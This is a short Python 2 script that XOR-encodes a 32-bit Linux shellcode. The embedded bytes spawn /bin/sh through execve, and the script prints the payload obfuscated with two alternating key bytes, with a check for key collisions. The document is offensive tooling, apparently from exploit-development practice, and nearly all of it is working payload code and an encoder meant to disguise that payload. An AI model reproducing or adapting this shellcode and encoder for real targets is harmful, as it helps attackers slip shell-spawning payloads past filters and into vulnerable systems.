#!/usr/bin/python

x = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded=""
encoded2=""

xorval1="88" #enter your 1st XOR value here
xorval2="dd" #enter your 2nd XOR value here

cnt=0

for i in bytearray(x):

  if cnt == 0:
	xorval=xorval1
	cnt+=1
  else:
	xorval=xorval2
	cnt=0

  z=i^int(xorval,16)
  z='%02x' % z

  encoded += "\\x"+z[0]+z[1]
  encoded2 += "0x"+z[0]+z[1]+","
 
  if i == int(xorval,16):      
      print "!!! Collision !!! with %s, choose a different XOR value." % xorval

  
print encoded
print encoded2[:-1]
print "XOR Value: "+xorval1+xorval2
